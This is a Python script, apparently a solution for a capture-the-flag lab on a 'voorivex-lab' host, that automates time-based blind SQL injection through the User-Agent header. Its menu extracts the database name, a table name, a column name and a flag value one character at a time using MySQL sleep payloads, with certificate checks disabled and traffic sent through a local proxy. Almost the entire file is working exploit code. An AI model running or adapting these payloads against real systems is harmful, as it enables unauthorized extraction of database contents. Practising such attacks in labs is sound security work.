import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def get_input():
    """Prompt the user for input and validate the choice."""
    while True:
        menu = (
            "What would you like to extract?\n"
            "[1] Extract the database name\n"
            "[2] Extract the table name\n"
            "[3] Extract the column name\n"
            "[4] Extract the flag\n"
        )
        choice = input(menu + "Enter your choice: ")
        try:
            choice = int(choice)
            if 1 <= choice <= 4:
                start(choice)
                return
            else:
                print("Invalid input! Please enter a number between 1-4.")
        except ValueError:
            print("Invalid input! Please enter a valid number between 1-4.")

def start(choice):
    """Choose the appropriate payload based on the user's choice and begin extraction."""
    # Define the payloads based on menu choice
    payloads = {
        1: "' + if((substring(database(),{i},1)='{char}'),sleep({timeout}),2) + '",
        2: "' + if((substring((SELECT table_name FROM information_schema.tables WHERE table_schema='crazy_log' LIMIT 1),{i},1)='{char}'),sleep({timeout}),2) + '",
        3: "' + if((substring((SELECT column_name FROM information_schema.columns WHERE table_schema='crazy_log' AND table_name='flag' LIMIT 1 OFFSET 1),{i},1)='{char}'),sleep({timeout}),2) + '",
        4: "' + if((substring((SELECT flag_value FROM flag LIMIT 1),{i},1)='{char}'),sleep({timeout}),2) + '"
    }

    # Get the payload for the selected choice
    payload = payloads.get(choice)
    if payload:
        url = "https://vhv5pwt4d4.voorivex-lab.online/"
        result = extract(url, payload)
        print(f"Extracted result: {result}")
    else:
        print("Invalid choice.")

def extract(url, payload_template, timeout=12):
    """Perform the blind SQL injection to extract data."""
    result = ""
    possible_chars = "abcdefghijklmnopqrstuvwxyz1234567890_"
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",

    }
    proxies = {
        "http": "http://127.0.0.1:8081",
        "https": "http://127.0.0.1:8081",
    }  # Add proxy information if needed

    for i in range(1, 40):  # Adjust the range based on the expected length of the result
        found_char = False
        for char in possible_chars:
            # Format the payload dynamically
            payload = payload_template.format(i=i, char=char, timeout=timeout)
            headers["User-Agent"] = payload

            try:
                # Measure the response time
                start_time = time.time()
                requests.get(url, headers=headers, proxies=proxies, verify=False)
                response_time = time.time() - start_time

                if response_time >= timeout:
                    result += char
                    print(f"Found Char {i}: {char}")
                    found_char = True
                    break
            except requests.RequestException as e:
                print(f"Request failed: {e}")
                return result

        if not found_char:
            print("Extraction Complete.")
            break

    return result

# Run the program
get_input()
